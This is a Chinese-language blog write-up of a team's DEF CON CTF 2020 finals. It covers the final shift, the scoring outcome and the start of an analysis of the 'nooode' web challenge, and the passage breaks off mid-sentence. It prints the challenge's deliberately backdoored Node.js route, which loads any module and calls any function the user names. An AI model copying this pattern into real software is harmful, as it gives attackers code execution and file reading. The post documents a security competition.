</p><p>&#x867D;&#x7136;&#x6CA1;&#x600E;&#x4E48;&#x770B;&#x61C2;&#x9006;&#x5411;&#x90E8;&#x5206;&#xFF0C;&#x4F46;&#x662F;&#x770B;&#x8D77;&#x6765;&#x6211;&#x4EEC;&#x90A3;&#x4E2A;&#x6539;&#x4E0B;&#x6CE8;&#x5206;&#x6570;&#x7684;&#x505A;&#x6CD5;&#x662F;&#x89E3;&#x6CD5;&#x4E4B;&#x4E00;&#xFF0C;&#x5E76;&#x4E14;&#x5176;&#x4ED6;&#x89E3;&#x6CD5;&#x770B;&#x8D77;&#x6765;&#x4E5F;&#x662F;&#x633A;&#x6709;&#x610F;&#x601D;&#x7684;&#x3002;</p><h2 id="Shift-4"><a href="#Shift-4" class="headerlink" title="Shift 4"></a>Shift 4</h2><p>&#x5728;&#x6700;&#x540E;&#x4E00;&#x5929;&#x5F00;&#x59CB;&#x51E0;&#x5C0F;&#x65F6;&#x4E4B;&#x540E;&#xFF0C;&#x4E3B;&#x529E;&#x65B9;&#x7EC8;&#x4E8E;&#x653E;&#x51FA;&#x4E86;&#x4E00;&#x4E2A;&#x672C;&#x573A;&#x552F;&#x4E00;&#x4E00;&#x4E2A; Web &#xFF0C;&#x9898;&#x76EE;&#x5730;&#x5740;&#x5728; <a href="https://github.com/o-o-overflow/dc2020f-nooode-public" target="_blank" rel="noopener">dc2020f-nooode-public</a> &#xFF0C;&#x6574;&#x4E2A;&#x9898;&#x76EE;&#x6211;&#x5F15;&#x7528; PPP &#x5BF9;&#x4E8E;&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x7684;&#x8BC4;&#x4EF7;&#x2014;&#x2014;&#x201C;By the start of the final day, all of us were pretty much at our limits. Fortunately, the OOO maintained a tradition of releasing <strong>silly web</strong> problems near the end of the competition, and this year was no exception.&#x201D;&#xFF08;&#x6B64;&#x5904;&#x91C7;&#x7528;&#x4E86;&#x5F15;&#x7528;&#x8BBA;&#x8BC1;&#xFF0C;&#x5F15;&#x7528;&#x4E86;&#x6BD4;&#x8F83;&#x6743;&#x5A01;&#x7684;&#x4EBA;&#x58EB;&#x5BF9;&#x4E8E;&#x9898;&#x76EE;&#x7684;&#x8BC4;&#x4EF7;&#xFF0C;&#x589E;&#x52A0;&#x4E86;&#x8BF4;&#x670D;&#x529B;&#xFF09;</p><p>&#x57FA;&#x672C;&#x4E0A;&#x53EF;&#x4EE5;&#x8BF4;&#x662F;&#x4E00;&#x53E5;&#x8BDD;&#x5728; Nodejs &#x4E0A;&#x7684;&#x5B8C;&#x7F8E;&#x4F53;&#x73B0;&#xFF0C;&#x4E8E;&#x662F;&#x4E00;&#x5F00;&#x59CB;&#x5C31;&#x6709;&#x4EBA;&#x5F00;&#x59CB;&#x76F4;&#x63A5;&#x6253;&#x4E86;&#xFF0C;&#x6211;&#x4EEC;&#x4E5F;&#x9A6C;&#x4E0A;&#x53D1;&#x73B0;&#x4E86;&#x8FD9;&#x4E2A; Backdooor &#xFF0C;&#x4E8E;&#x662F;&#x6211;&#x4EEC;&#x4E5F;&#x5F00;&#x59CB;&#x6253;&#xFF0C;&#x4F46;&#x662F;&#x7531;&#x4E8E;&#x8FD9;&#x4E2A; Backdooor &#x771F;&#x7684;&#x662F; silly &#xFF0C;&#x5F88;&#x591A;&#x961F;&#x90FD;&#x8FC5;&#x901F;&#x4FEE;&#x4E86;&#xFF08;&#x9664;&#x4E86; pasten &#x8C8C;&#x4F3C;&#x6CA1;&#x4EBA;&#x53C2;&#x8D5B;&#xFF09;&#xFF0C;&#x540E;&#x9762;&#x4E5F;&#x5C31;&#x6CA1;&#x4EC0;&#x4E48;&#x6253;&#x6CD5;&#x4E86;&#x3002;&#x540E;&#x9762;&#x901A;&#x8FC7;&#x6211;&#x4EEC;&#x961F;&#x91CC;&#x5DE8;&#x5F3A;&#x7684;&#x67D0;&#x5E08;&#x5085;&#x4E0A;&#x4E86;&#x4ED6;&#x5199;&#x7684;&#x5DE8;&#x5F3A;&#x7684; WAF &#xFF0C;&#x6211;&#x4EEC;&#x62E5;&#x6709;&#x4E86;&#x5DE8;&#x5F3A;&#x7684;&#x9632;&#x5B88;&#x80FD;&#x529B;&#x3002;</p><p>&#x4E8E;&#x662F;&#x5C31;&#x8DDF; A0E &#x67D0;&#x5E08;&#x5085;&#x5C2C;&#x804A;&#x4E86;&#xFF0C;</p><p>But &#x6BD4;&#x8D5B;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x6709;&#x4E00;&#x8F6E;&#x7A81;&#x7136;&#x6211;&#x4EEC;&#x53C8;&#x53EF;&#x4EE5;&#x6253;&#x5F88;&#x591A;&#x961F;&#xFF0C;&#x7A81;&#x7136;&#x53D1;&#x73B0;&#x4E3B;&#x529E;&#x65B9;&#x8C8C;&#x4F3C;&#x53C8;&#x5728;&#x6CA1;&#x63D0;&#x524D;&#x901A;&#x77E5;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF08;&#x4E5F;&#x597D;&#x50CF;&#x662F;&#x901A;&#x77E5;&#x4E86;&#x6211;&#x6CA1;&#x6CE8;&#x610F;&#xFF09;&#x91CD;&#x7F6E;&#x4E86;&#x5404;&#x961F;&#x4F0D;&#x7684;&#x73AF;&#x5883;&#xFF0C;&#x6211;&#x4EEC;&#x53D1;&#x73B0;&#x4E86;&#x53C8;&#x7ACB;&#x9A6C;&#x4FEE;&#x4E86;&#x4E00;&#x6CE2;&#xFF0C;&#x7136;&#x540E;&#x53D1;&#x73B0;&#x662F;&#x52A0;&#x5F3A;&#x4E86; Check &#xFF0C;&#x53EA;&#x80FD;&#x628A;&#x8D85;&#x5F3A;&#x5E08;&#x5085;&#x5199;&#x7684;&#x8D85;&#x5F3A; WAF &#x778E;&#x6389;&#x4E86;&#xFF0C;&#x56E0;&#x6B64;&#x53C8;&#x6389;&#x4E86;&#x4E00;&#x4E9B;&#x5206;&#xFF08;</p><p>But &#x6BD4;&#x8D5B;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x8C8C;&#x4F3C;&#x6709;&#x4E00;&#x4E2A;&#x975E; Web AWD &#x9898;&#x76EE;&#x63D0;&#x4EA4;&#x7684; Patch &#x6CA1;&#x901A;&#x8FC7;&#x800C;&#x4E3B;&#x529E;&#x65B9;&#x6CA1;&#x901A;&#x77E5;&#x6211;&#x4EEC;&#x5C31;&#x7ACB;&#x9A6C;&#x65AD;&#x4E86;&#x6211;&#x4EEC;&#x8DF3;&#x677F;&#x673A;&#x7F51;&#x7EDC;&#xFF0C;&#x5BFC;&#x81F4;&#x5F71;&#x54CD;&#x4E86;&#x6211;&#x4EEC;&#x5927;&#x6982;&#x4E24;&#x8F6E;&#x7684;&#x64CD;&#x4F5C;&#x3002;</p><p>Web &#x540E;&#x9762;&#x4F1A;&#x5355;&#x72EC;&#x505A;&#x4E00;&#x4E9B;&#x7B80;&#x5355;&#x7684;&#x5206;&#x6790;&#xFF0C;Web &#x9898;&#x6BD4;&#x8F83;&#x8BA9;&#x6211;&#x610F;&#x5916;&#x7684;&#x662F;&#xFF0C;A0E &#x4ED6;&#x4EEC;&#x4F7F;&#x7528;&#x7684;&#x662F;&#x9ED1;&#x540D;&#x5355;&#x8FC7;&#x6EE4;&#x7684;&#x673A;&#x5236;&#xFF0C;&#x88AB;&#x6211;&#x4EEC;&#x7684;&#x8D85;&#x7EA7;&#x5927;&#x5E08;&#x5085;&#x624B;&#x52A8;&#x7ED5;&#x4E86;&#xFF0C;&#x6253;&#x4E86;&#x4E24;&#x56DE;&#x5408;&#x5C31;&#x88AB;&#x4FEE;&#x4E86;&#xFF0C;&#x8FD9;&#x4E5F;&#x6210;&#x4E86;&#x540E;&#x9762;&#x7684;&#x4E00;&#x4E2A;&#x4F0F;&#x7B14;&#x3002;&#xFF08;&#x67D0;&#x4E2A;&#x6E23;&#x7537;&#x7ADF;&#x7136;&#x8DDF;&#x6211;&#x8BF4;&#x8981;&#x7761;&#x4E86;&#x5374;&#x8FD8;&#x5728;&#x770B;&#x6D41;&#x91CF;</p><p>Stealth Port &#x7684;&#x6D41;&#x91CF;&#x5B98;&#x65B9;&#x4E5F;&#x516C;&#x5E03;&#x4E86;&#xFF1A;<a href="https://oooverflow.io/dc-ctf-2020-finals/stealth.txt" target="_blank" rel="noopener">https://oooverflow.io/dc-ctf-2020-finals/stealth.txt</a> &#xFF0C;&#x867D;&#x7136;&#x770B;&#x7684;&#x6709;&#x70B9;&#x8FF7;&#x60D1;&#xFF0C;&#x4E0D;&#x8FC7;&#x8FD8;&#x662F;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6700;&#x540E;&#x6211;&#x4EEC; Web &#x786E;&#x5B9E;&#x6253;&#x4E86;&#x4ED6;&#x4EEC;&#x4E00;&#x6CE2;&#x3002;</p><p>&#x540E;&#x9762;&#x5C01;&#x699C;&#x7136;&#x540E;&#x5230;&#x7ED3;&#x675F;&#xFF0C;&#x57FA;&#x672C;&#x5C31;&#x6CA1;&#x6709;&#x4EC0;&#x4E48;&#x64CD;&#x4F5C;&#x4E86;&#xFF0C;&#x5C01;&#x699C;&#x524D;&#x6211;&#x770B;&#x4E86;&#x4E00;&#x4E0B;&#x5206;&#x6570;&#x5DEE;&#x8DDD;&#xFF0C;&#x6211;&#x89C9;&#x5F97;&#x6211;&#x4EEC;&#x662F;&#x5E94;&#x8BE5;&#x8DDF; HITCON &#x4E89;&#x7B2C;&#x4E09;&#xFF0C;PPP &#x8DDF; A0E &#x62A2;&#x7B2C;&#x4E00;&#x3002;</p><p>&#x7ED3;&#x675F;&#x4E4B;&#x540E;&#xFF0C;&#x867D;&#x7136;&#x7A97;&#x5916;&#x7684;&#x9633;&#x5149;&#x683C;&#x5916;&#x7684;&#x523A;&#x773C;&#xFF0C;&#x5317;&#x4EAC;&#x65E9;&#x9AD8;&#x5CF0;&#x4F34;&#x968F;&#x7740;&#x6C7D;&#x8F66;&#x7684;&#x9E23;&#x7B1B;&#x5DF2;&#x7ECF;&#x7EB7;&#x81F3;&#x6C93;&#x6765;&#xFF0C;&#x4F46;&#x662F;&#x5BA4;&#x5185;&#x6211;&#x4EEC;&#x6BD4;&#x8F83;&#x5E73;&#x9759;&#xFF0C;&#x5927;&#x5BB6;&#x90FD;&#x6536;&#x62FE;&#x6536;&#x62FE;&#x4E1C;&#x897F;&#xFF0C;&#x6361;&#x4E86;&#x6361;&#x5783;&#x573E;&#x65B9;&#x4FBF;&#x963F;&#x59E8;&#x6253;&#x626B;&#xFF0C;&#x968F;&#x4FBF;&#x804A;&#x4E86;&#x804A;&#x770B;&#x4E86;&#x770B;&#x5176;&#x4ED6;&#x961F;&#x5BF9;&#x4E8E;&#x8FD9;&#x6B21;&#x6BD4;&#x8D5B;&#x7684;&#x5410;&#x69FD;&#xFF0C;&#x7136;&#x540E;&#x5C31;&#x90FD;&#x5404;&#x81EA;&#x56DE;&#x53BB;&#x4F11;&#x606F;&#x4E86;&#x3002;&#x6211;&#x56DE;&#x53BB;&#x540E;&#x5F00;&#x7740; DEFCON &#x76F4;&#x64AD;&#x7B49;&#x4E86;&#x597D;&#x4E00;&#x4F1A;&#xFF0C;&#x53D1;&#x73B0;&#x4ED6;&#x4EEC;&#x8FD8;&#x633A;&#x78E8;&#x8E6D;&#x7684;&#xFF0C;&#x987A;&#x4FBF;&#x6D17;&#x4E86;&#x4E2A;&#x6FA1;&#xFF0C;&#x56DE;&#x6765;&#x7B49;&#x5F85;&#x7740;&#x63ED;&#x6653;&#x6700;&#x7EC8;&#x7ED3;&#x679C;&#x3002;</p><p>&#x540E;&#x9762;&#x516C;&#x5E03;&#x699C;&#x5355;&#xFF0C;&#x5F97;&#x77E5;&#x6211;&#x4EEC;&#x662F;&#x62FF;&#x5230;&#x4E86;&#x7B2C;&#x56DB;&#x540D;&#xFF0C;&#x81EA;&#x5DF1;&#x5012;&#x4E5F;&#x6CA1;&#x6709;&#x4EC0;&#x4E48;&#x7279;&#x522B;&#x7684;&#x5FC3;&#x60C5;&#xFF0C;&#x77E5;&#x9053;&#x4E4B;&#x540E;&#x4E5F;&#x5C31;&#x6574;&#x7406;&#x6574;&#x7406;&#x8FD9;&#x4E24;&#x5929;&#x7684;&#x9898;&#x76EE;&#xFF0C;&#x770B;&#x4E86;&#x770B;&#x5927;&#x5BB6;&#x5BF9;&#x4E8E;&#x8FD9;&#x6B21;&#x6BD4;&#x8D5B;&#x7684;&#x8BC4;&#x8BBA;&#xFF0C;&#x4E4B;&#x540E;&#x5C31;&#x7761;&#x4E86;&#x3002;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013012759.jpeg" alt></p><p>&#x5012;&#x662F;&#x5728;&#x63ED;&#x6653;&#x4E00;&#x4E8C;&#x540D;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4E3B;&#x529E;&#x65B9;&#x5E94;&#x8BE5;&#x662F;&#x7279;&#x5730;&#x505A;&#x4E86;&#x4E00;&#x4E2A;&#x5206;&#x6570;&#x52A8;&#x6001;&#x56FE;&#x6765;&#x663E;&#x793A;&#x6700;&#x540E;&#x6BD4;&#x8D5B;&#x7684;&#x6FC0;&#x70C8;&#xFF0C;&#x70D8;&#x6258;&#x4E00;&#x4E0B;&#x7D27;&#x5F20;&#x7684;&#x6C1B;&#x56F4;&#xFF0C;&#x6700;&#x540E;&#x663E;&#x793A; A0E &#x4EE5; 2 &#x5206;&#x7684;&#x4F18;&#x52BF;&#x9669;&#x80DC; PPP &#x62FF;&#x5230;&#x4E86;&#x51A0;&#x519B;&#xFF0C;&#x4E5F;&#x610F;&#x5473;&#x7740;&#x5237;&#x65B0;&#x4E86;&#x4E2D;&#x56FD;&#x5927;&#x9646;&#x6218;&#x961F;&#x5728; DEFCON CTF &#x4E0A;&#x53D6;&#x5F97;&#x7684;&#x6700;&#x597D;&#x7684;&#x6210;&#x7EE9;&#xFF0C;&#x4E5F;&#x7B97;&#x8C01;&#x89C1;&#x8BC1;&#x4E86;&#x4E00;&#x6B21;&#x5386;&#x53F2;&#x5427; XD</p><h2 id="Nooode"><a href="#Nooode" class="headerlink" title="Nooode"></a>Nooode</h2><p>&#x9898;&#x76EE;&#x5730;&#x5740;&#xFF1A;<a href="https://github.com/o-o-overflow/dc2020f-nooode-public" target="_blank" rel="noopener">https://github.com/o-o-overflow/dc2020f-nooode-public</a> &#xFF0C;&#x611F;&#x5174;&#x8DA3;&#x7684;&#x540C;&#x5B66;&#x53EF;&#x4EE5;&#x53BB;&#x5206;&#x6790;&#x590D;&#x73B0;&#x4E00;&#x4E0B;&#x3002;</p><p>Web &#x9898;&#x95EE;&#x9898;&#x4E3B;&#x8981;&#x662F;&#x5728; public-nooode/routes/config.js &#x6587;&#x4EF6;&#x4E2D;&#x5B58;&#x5728;&#x4E00;&#x5904; BackDooor </p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="hljs-string">&apos;/validated/:lib?/:f?&apos;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">let</span> config = res.locals.config;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> (!req.params.lib) req.params.lib = <span class="hljs-string">&quot;json-schema&quot;</span></span><br><span class="line">  <span class="hljs-keyword">if</span> (!req.params.f) req.params.f = <span class="hljs-string">&quot;validate&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">let</span> jsonlib = <span class="hljs-built_in">require</span>(req.params.lib)</span><br><span class="line">  <span class="hljs-keyword">let</span> valid = jsonlib[req.params.f](req.body)</span><br><span class="line">  <span class="hljs-keyword">if</span> (!valid) {</span><br><span class="line">    res.send(<span class="hljs-string">&quot;validator failed&quot;</span>);</span><br><span class="line">    <span class="hljs-keyword">return</span></span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">let</span> p;</span><br><span class="line">  <span class="hljs-keyword">if</span> (config.path) { </span><br><span class="line">    p = config.path;</span><br><span class="line">  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (config.filepath) {</span><br><span class="line">    p = config.filepath;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">let</span> data = fs.readFileSync(p).toString()</span><br><span class="line">  <span class="hljs-keyword">try</span> {</span><br><span class="line">    data = <span class="hljs-built_in">JSON</span>.parse(data)</span><br><span class="line">    <span class="hljs-keyword">if</span> (_.isEqual(req.body, data))</span><br><span class="line">      res.json(data)</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">    res.send({ <span class="hljs-string">&quot;validator&quot;</span>: valid, <span class="hljs-string">&quot;data&quot;</span>:data, <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;data is corrupted&quot;</span>})</span><br><span class="line">  } <span class="hljs-keyword">catch</span> {</span><br><span class="line">    res.send({ <span class="hljs-string">&quot;validator&quot;</span>: valid, <span class="hljs-string">&quot;data&quot;</span>:data})</span><br><span class="line">  }</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6BD4;&#x8F83;&#x719F;&#x6089;&#x7684;&#x540C;&#x5B66;&#x53EF;&#x4EE5;&#x4E00;&#x773C;&#x5C31;&#x770B;&#x770B;&#x5230;&#x95EE;&#x9898;&#x6240;&#x5728;&#x4E86;&#x3002;</p><p>&#x7531;&#x4E8E;&#x5B98;&#x65B9;&#x63D0;&#x4F9B;&#x7684;&#x662F;&#x6574;&#x573A;&#x6BD4;&#x8D5B;&#x6240;&#x6709;&#x7684;&#x6D41;&#x91CF;&#x5305;&#x8FC7;&#x5927;&#xFF0C;&#x5E76;&#x6CA1;&#x6709;&#x5177;&#x4F53;&#x5206;&#x7C7B;&#xFF0C;&#x6574;&#x4E2A;&#x6D41;&#x91CF;&#x5305;&#x591A;&#x8FBE; 200 GB &#xFF0C;&#x800C;&#x4E14;&#x5BF9;&#x4E8E; Web &#x9898;&#x76EE;&#x6765;&#x8BF4;&#xFF0C;&#x57FA;&#x672C;&#x51E0;&#x4E2A;&#x6D41;&#x91CF;&#x5305;&#x5C31;&#x80FD;&#x62FF;&#x5230;&#x5927;&#x591A;&#x6570;&#x7684; Payload &#x4E86;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x62FF;&#x4E86;&#x6211;&#x624B;&#x5934;&#x4E0A;&#x5F53;&#x65F6;&#x4E0B;&#x8F7D;&#x7684;&#x57FA;&#x672C;&#x5206;&#x90E8;&#x4E86;&#x5927;&#x591A;&#x6570;&#x65F6;&#x95F4;&#x6BB5;&#x7684;&#x6D41;&#x91CF;&#x5305;&#xFF0C;&#x63D0;&#x53D6;&#x4E86;&#x4E00;&#x4E0B; HTTP &#x6D41;&#x91CF;&#x5E76;&#x8FDB;&#x884C;&#x4E86;&#x7B80;&#x5355;&#x7EDF;&#x8BA1;&#x5904;&#x7406;&#xFF0C;&#x5E76;&#x6309;&#x7167;&#x51FA;&#x73B0;&#x7684;&#x6B21;&#x6570;&#x8FDB;&#x884C;&#x4E86;&#x4ECE;&#x9AD8;&#x5230;&#x4F4E;&#x7684;&#x6392;&#x5E8F;&#xFF0C;&#x5F97;&#x5230;&#x4E86;&#x4EE5;&#x4E0B;&#x7684;&#x7ED3;&#x679C;&#xFF1A;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013015810.png" alt></p><p>&#x5947;&#x602A;&#xFF0C;&#x4E2D;&#x95F4;&#x597D;&#x50CF;&#x6DF7;&#x5165;&#x4E86;&#x4EC0;&#x4E48;&#x5947;&#x602A;&#x7684;&#x4E1C;&#x897F;&#xFF08;</p><p>&#x5F53;&#x7136;&#x5176;&#x4ED6;&#x6D41;&#x91CF;&#x5305;&#x6216;&#x8BB8;&#x8FD8;&#x53EF;&#x80FD;&#x5B58;&#x5728;&#x4E00;&#x4E9B;&#x5176;&#x4ED6;&#x7684; Payload 